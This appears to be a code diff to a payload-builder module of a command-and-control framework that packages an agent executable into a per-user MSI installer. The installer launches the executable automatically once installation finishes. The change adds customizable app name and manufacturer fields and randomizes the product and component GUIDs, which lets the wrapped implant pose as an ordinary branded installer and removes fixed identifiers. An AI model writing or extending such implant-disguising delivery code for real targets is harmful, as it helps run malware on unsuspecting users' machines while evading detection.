@@ -10,6 +10,7 @@ import shutil
 import base64
 import random
 import subprocess
+import uuid
 
 
 import tempfile
@@ -28,10 +29,22 @@ class msi_wraps_exe(PayloadType):
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
         BuildParameter(
+            name = "name",
+            parameter_type=BuildParameterType.String,
+            default_value="MyApp",
+            description="Defines the application name",
+        ),
+        BuildParameter(
             name = "exe_name",
             parameter_type=BuildParameterType.String,
             default_value="MyApp.exe",
             description="Defines the exe name",
+        ),
+        BuildParameter(
+            name = "manufacturer",
+            parameter_type=BuildParameterType.String,
+            default_value="MyApp Inc.",
+            description="Defines the manufacturer",
         ),
     ]
 
@@ -46,12 +59,16 @@ class msi_wraps_exe(PayloadType):
 
         try:
             exe_payload = self.wrapped_payload
+            app_name = self.get_parameter('name')
             exe_name = self.get_parameter('exe_name')
+            manufacturer = self.get_parameter('manufacturer')
+            product_guid = uuid.uuid4()
+            component_guid = uuid.uuid4()
 
             wxs_payload = """<?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
-  <Product Id="*" Name="MyApp" Language="1033" Version="1.0.0.0"
-           Manufacturer="NoAdmin Inc." UpgradeCode="12345678-1234-1234-1234-123456789abc">
+  <Product Id="*" Name="{app_name}" Language="1033" Version="1.0.0.0"
+           Manufacturer="{manufacturer}" UpgradeCode="{product_guid}">
 
     <Package InstallerVersion="500" Compressed="yes" InstallScope="perUser" />
 
@@ -59,9 +76,9 @@ class msi_wraps_exe(PayloadType):
 
     <Directory Id="TARGETDIR" Name="SourceDir">
       <Directory Id="LocalAppDataFolder">
-        <Directory Id="INSTALLDIR" Name="MyApp">
-          <Component Id="MainExecutable" Guid="e4e4e4e4-e4e4-e4e4-e4e4-e4e4e4e4e4e4">
-            <File Id="MyAppFile" Name="{exe_name}" Source="{exe_name}" KeyPath="yes" />
+        <Directory Id="INSTALLDIR" Name="{app_name}">
+          <Component Id="MainExecutable" Guid="{component_guid}">
+            <File Id="{app_name}File" Name="{exe_name}" Source="{exe_name}" KeyPath="yes" />
           </Component>
         </Directory>
       </Directory>
@@ -72,7 +89,7 @@ class msi_wraps_exe(PayloadType):
     </Feature>
 
     <!-- Custom Action to Run Executable -->
-    <CustomAction Id="LaunchFile" FileKey="MyAppFile" ExeCommand="" Return="asyncNoWait" Impersonate="yes" />
+    <CustomAction Id="LaunchFile" FileKey="{app_name}File" ExeCommand="" Return="asyncNoWait" Impersonate="yes" />
 
     <!-- Run it after install (but before UI ends) -->
     <InstallExecuteSequence>
@@ -88,7 +105,7 @@ class msi_wraps_exe(PayloadType):
                 f.close()
 
                 f = open(os.path.join(temp_dir, "Product.wxs"), "w")
-                f.write(wxs_payload.format(exe_name=exe_name))
+                f.write(wxs_payload.format(exe_name=exe_name, app_name=app_name, manufacturer=manufacturer, product_guid=product_guid, component_guid=component_guid))
                 f.close()
 
                 subprocess.run(['wixl', '-o', 'Installer.msi', 'Product.wxs'], cwd=temp_dir, capture_output=True, text=True)
